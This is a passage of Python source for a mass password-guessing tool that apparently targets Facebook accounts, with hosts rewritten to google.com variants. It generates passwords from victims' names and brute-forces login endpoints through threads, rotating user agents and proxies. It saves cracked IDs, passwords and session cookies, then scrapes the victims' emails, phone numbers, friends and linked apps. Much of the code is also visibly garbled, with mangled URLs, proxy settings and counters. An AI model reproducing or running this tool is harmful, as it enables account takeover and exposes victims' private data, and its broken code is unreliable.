    ioz = '[01] METHOD M-FACEBOOK\n[02] METHOD FREE-FACEBOOK\n[03] METHOD TOUCH-FACEBOOK\n[04] METHOD MBASIC-FACEBOOK'
    gess = nel(ioz, style='cyan')
    cetak(nel(gess, title=' • METHOD • '))
    hc = input(x)
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    elif hc in ['3','03']:
        method.append('touch')
    elif hc in ['4','04']:
        method.append('mbasic')
    else:
        method.append('mobile')
    guw = '# LINKED APP VIEW ? (y/t)'
    sol().print(mark(guw, style='cyan'))
    aplik = input(x)
    if aplik in ['y','Y']:
        taplikasi.append('ya')
    else:
        taplikasi.append('no')
    guw = '# SHOW CHECKPOINT OPTIONS ? (y/t)'
    sol().print(mark(guw, style='cyan'))
    osk = input(x)
    if osk in ['y','Y']:
        oprek.append('ya')
    else:
        oprek.append('no')

    guw = '# SHOW CHECKPOINT RESULT ? (y/t)'
    sol().print(mark(guw, style='cyan'))
    cpres = input(x)
    if cpres in ['y','Y']:
        princp.append('ya')
    else:
        princp.append('no')
    guw = '# WANT TO USE ADDITIONAL PASSWORD ? (y/t)'
    sol().print(mark(guw, style='cyan'))
    pwplus=input(x)
    if pwplus in ['y','Y']:
        pwpluss.append('ya')
        krek = '[•] USE COMMA AS SEPARATE\n[•] USE LOWER LETTERS\n[•] EXAMPLE: indonesia,germany,bangladesh'
        cetak(nel(krek, title=' • ADDITIONAL PASSWORD • '))
        pwku=input('ENTER ADDITIONAL PASSWORD : ')
        pwkuh=pwku.split(',')
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append('no')
    passwrd()

# WORDLIST
def passwrd():
    ler = '# CRACK PROCESS START, PRESS CTRL Z TO STOP'
    sol().print(mark(ler, style='green'))
    krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
    cetak(nel(krek, title=' • CRACK • '))
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            try:
                idf,nmf,ttl = yuzong.split('|')[0],yuzong.split('|')[1].lower(),yuzong.split('|')[2].lower()
            except:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs, )
                    if 'ya' in pwpluss:
                        for xpwd in pwnya:
                            pwv.append(xpwd)


            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    if 'ya' in pwpluss:
                        for xpwd in pwnya:
                            pwv.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack,idf,pwv,nmf)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(cracktouch,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic,idf,pwv)
            else:
                pool.submit(crackmbasic,idf,pwv)
    print('')
    tanya = '# CRACKING FINISH'
    sol().print(mark(tanya, style='green'))
    exit()

# CRACKER
def crack(idf,pwv,nmf):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    ua = random.choice(ugen)
#   ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.1.2222.33 Safari/537.36'
    ua2 = random.choice(ugen2)
    nip=random.choice(prox)
    ses=requests.Session()
    proxs= {'http': 'socks5://', nip:nmf}
    sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
    for pw in pwv:
        try:
            secua=re.findall(' Chrome/(.*?)Mobile Safari/537.36',str(ua))[0].split('.')[0]
            ses.headers.update({"Host":'dns.google.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://dns.google.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
#           ses.headers.update({'Host': 'm.google.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.google.com/login/device-based/password/?uid=', idf, 'next=https%3A%2F%2Fm.google.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddblflow=login_no_pinrefsrc=deprecatedref=dbl_rdr')
            readable = str(time.time()).split('.')[0]
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.google.com/login/save-device/?login_source=loginrefsrc=deprecatedref=dbl","flow":"login_no_pin","encpass":f'#PWD_BROWSER:0:{readable}:{pw}'}
            coki={}
            coki1=p.cookies.get_dict()
            coki.update(coki1)
            coki.update({'m_pixel_ratio': '2.625','wd': '412x756'})
#tapyes         ses.headers.update({'Host': 'm.google.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','origin': 'https://m.google.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.google.com/login/device-based/password/?uid=' idf 'next=https%3A%2F%2Fm.google.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddblflow=login_no_pinrefsrc=deprecatedref=dbl_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7'})
            ses.headers.update({'Host': 'm.google.com','upgrade-insecure-requests': '1','cache-control': 'max-age=0','sec-ch-ua': f'" Not A;Brand";v="{secua}", "Chromium";v="{secua}"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','origin': 'https://m.google.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'no-cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.google.com/login/device-based/password/?uid=', idf: 'next=https%3A%2F%2Fm.google.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin%26refsrc%3Ddeprecated%26ref%3Ddblflow=login_no_pinrefsrc=deprecatedref=dbl_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'zh-HK,zh;q=0.9,en-US;q=0.8,en;q=0.7'})
            po = ses.post('https://m.google.com/login/device-based/validate-password/?shbl=0ref=dbl',cookies=coki,data=dataa,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    idfs=idf
                    pws=pw
                    cp =1
                    try:
                        cekopsii(idfs,pws)
                    except:
                        cekopsii(idfs,pws)

                elif 'ya' in princp:
                    print('\n')
                    try:
                        statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}\n[•] BIRTHDAY : {ttl}'
                        open.write(idf,)
                    except:
                        statuscp = f'\r[•] ID       : {idf} \n[•] PASSWORD : {pw} \n[•] NAME : {nmf}'
                        open.write(idf, )
                    statuscp1 = nel(statuscp, style='yellow')
                    cetak(nel(statuscp1, title='SHINZY CP'))
                    cp =1
                else:continue
                break
            elif "c_user" in po.cookies.get_dict().keys():
                headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                if 'no' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='SHINZY LIVE'))
                    ok =1
                    break
                elif 'ya' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    user=idf
                    infoakun = ""
                    session = requests.Session()
                    emhp=requests.get('https://mbasic.google.com/profile.php?v=info',cookies=coki,headers=headapp).text
                    try:
                        email=re.search('target="_blank">(.*?)#064;(.*?)<',str(emhp)).groups(1)
                        infoakun = (f"[bold green][•] EMAIL : {email[0]}@{email[1]}[/bold green]\n")
                    except:
                        infoakun = (f"[bold green][•] EMAIL : - [/bold green]\n")
                    try:
                        nohp=re.search('>08(.*?)-(.*?)-(.*?)</span>',str(emhp)).groups(1)
                        infoakun = (f"[bold green][•] PHONE NUMBER : 08{nohp[0]}{nohp[1]}{nohp[2]}[/bold green]\n")
                    except:
                        infoakun = (f"[bold green][•] PHONE NUMBER : - [/bold green]\n")
                    try:
                        tems=session.get('https://mbasic.google.com/profile.php?id=', idf, 'v=friends',cookies=coki,headers=headapp).text
                        teman=re.search('>Teman (.*?)<',str(tems)).groups(1)
                        tem=teman[0].split('(')
                        temm=tem[1].split(')')
                        infoakun = (f"[bold green][•] FRIEND : {temm[0]}[/bold green]\n")
                    except:
                        infoakun = (f"[bold green][•] FRIEND : - [/bold green]\n")
                    try:
                        tahs=session.get('https://mbasic.google.com/', idf, '/allactivity/?entry_point=settings_yfisettings_tracking=mbasic_footer_link%3Asettings_2_0privacy_source=your_facebook_information_rdr',cookies=coki,headers=headapp).text
                        tah=re.findall('id="year_(.*?)"',str(tahs))
                        tahu=(len(tah)-1)
                        tahun=tah[tahu]
                        infoakun = (f"[bold green][•] YEAR ACCOUNT : {tahun} [/bold green]\n")
                    except:
                        infoakun = (f"[bold green][•] YEAR ACCOUNT : -  [/bold green]\n")


                    cek2 = session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    cek =session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    infoakun  = (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
                    apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                    nok=1
                    for muncul in apkaktif:
                        infoakun = (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
                        nok =1

                    hit=0
                    infoakun  = (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
                    apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                    hit=0
                    for muncul in apkexp:
                        hit =1
                        infoakun  = (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
                    print('\n')
                    statusok = f'[bold green]\r[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='[bold green]SHINZY LIVE[/bold green]'))
                    ok =1
                    break


            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop =1


def crackfree(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    nip=random.choice(prox)
    proxs= {'http': 'socks5://', nip:nmf}
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
    for pw in pwv:
        try:
            ses.headers.update({'Host': 'dns.google.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://dns.google.com/login/device-based/password/?uid=', idf, 'flow=login_no_pinrefsrc=deprecated_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://dns.google.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki =' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'dns.google.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://dns.google.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://dns.google.com/login/device-based/password/?uid=', idf: 'flow=login_no_pinrefsrc=deprecated_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
            po = ses.post('https://dns.google.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf, )
                    ceker(idf,pw)
                elif 'ya' in princp:
                    print('\n')
                    statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                    statuscp1 = nel(statuscp, style='yellow')
                    cetak(nel(statuscp1, title='SHINZY CP'))
                    open('/root/bin/CP/').write(idf, )
                    akun.append(idf, )
                    cp =1
                else:continue
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                if 'no' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='SHINZY LIVE'))
                    ok =1
                    break
                elif 'ya' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    user=idf
                    infoakun = ""
                    session = requests.Session()
                    cek2 = session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    cek =session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    infoakun  = (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
                    apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                    nok=1
                    for muncul in apkaktif:
                        infoakun = (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
                        nok =1

                    hit=0
                    infoakun  = (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
                    apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                    hit=0
                    for muncul in apkexp:
                        hit =1
                        infoakun  = (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
                    print('\n')
                    statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='[bold green]SHINZY LIVE[/bold green]'))
                    ok =1
                    break


            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop =1


def cracktouch(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    nip=random.choice(prox)
    proxs= {'http': 'socks5://', nip:nmfile}
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
    for pw in pwv:
        try:
            ses.headers.update({'Host': 'touch.google.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://touch.google.com/login/device-based/password/?uid=', idf, 'flow=login_no_pinrefsrc=deprecated_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://touch.google.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki =' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'touch.google.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://touch.google.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://touch.google.com/login/device-based/password/?uid=', idf: 'flow=login_no_pinrefsrc=deprecated_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
            po = ses.post('https://touch.google.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf, )
                    ceker(idf,pw)
                elif 'ya' in princp:
                    print('\n')
                    statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                    statuscp1 = nel(statuscp, style='yellow')
                    cetak(nel(statuscp1, title='SHINZY CP'))
                    open('/root/bin/CP/').write(idf, )
                    akun.append(idf, )
                    cp =1
                else:continue
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                if 'no' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='SHINZY LIVE'))
                    ok =1
                    break
                elif 'ya' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    user=idf
                    infoakun = ""
                    session = requests.Session()
                    cek2 = session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    cek =session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    infoakun  = (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
                    apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                    nok=1
                    for muncul in apkaktif:
                        infoakun = (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
                        nok =1

                    hit=0
                    infoakun  = (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
                    apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                    hit=0
                    for muncul in apkexp:
                        hit =1
                        infoakun  = (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
                    print('\n')
                    statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='[bold green]SHINZY LIVE[/bold green]'))
                    ok =1
                    break


            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop =1
def crackmbasic(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    nip=random.choice(prox)
    proxs= {'http': 'socks5://', nip:next}
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    sys.stdout.write('\r%s SHIN %s/%s [ OK:%s - CP:%s - %s%s%s ]'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
    for pw in pwv:
        try:

            ses.headers.update({'Host': 'mbasic.google.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.google.com/login/device-based/password/?uid=', idf, 'flow=login_no_pinrefsrc=deprecated_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.google.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki =' m_pixel_ratio=2.625; wd=412x756'
            heade={'Host': 'mbasic.google.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.google.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.google.com/login/device-based/password/?uid=', idf: 'flow=login_no_pinrefsrc=deprecated_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
            po = ses.post('https://mbasic.google.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf,)
                    ceker(idf,pw)
                elif 'ya' in princp:
                    print('\n')
                    statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                    statuscp1 = nel(statuscp, style='yellow')
                    cetak(nel(statuscp1, title='SHINZY CP'))
                    open('/root/bin/CP/').write(idf, )
                    akun.append(idf, )
                    cp =1
                else:continue
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
                if 'no' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    ok =1
                    break
                elif 'ya' in taplikasi:
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('/root/bin/OK/').write(idf, )
                    user=idf
                    infoakun = ""
                    session = requests.Session()
                    cek2 = session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                    cek =session.get("https://mbasic.google.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                    infoakun  = (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n")
                    apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
                    nok=1
                    for muncul in apkaktif:
                        infoakun = (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n")
                        nok =1

                    hit=0
                    infoakun  = (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n")
                    apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
                    hit=0
                    for muncul in apkexp:
                        hit =1
                        infoakun  = (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n")
                    print('\n')
                    statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='[bold green]AOREC-XD OK[/bold green]'))
                    ok =1
                    break


            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop =1


# OPSI CEKER
def cek_opsi():
    c = len(akun)
    hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
    cetak(nel(hu, title='CEK OPSI'))
    input(x)
    cek = '# PROSES CEK OPSI DIMULAI'
    sol().print(mark(cek, style='green'))
    love = 1
    for kes in akun:
            try:
                idfs,pws,ttl= kes.split('|')[0],kes.split('|')[1],kes.split('|')[2]
            except:
                idfs,pws= kes.split('|')[0],kes.split('|')[1]
                continue
            print('\r[C] CHECKING ID [ %s ] [ %s/%s]'%(idfs,love,len(akun)), end=' ');sys.stdout.flush()
            try:
                cekopsii(idfs, pws)
            except:
                cekopsii(idfs,pws)
            love =1
    dah = '# DONE'
    sol().print(mark(dah, style='green'))
    exit()
def cekopsii(id,pw):
        try:
            ua = 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-F900U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36'
            req=requests.Session()
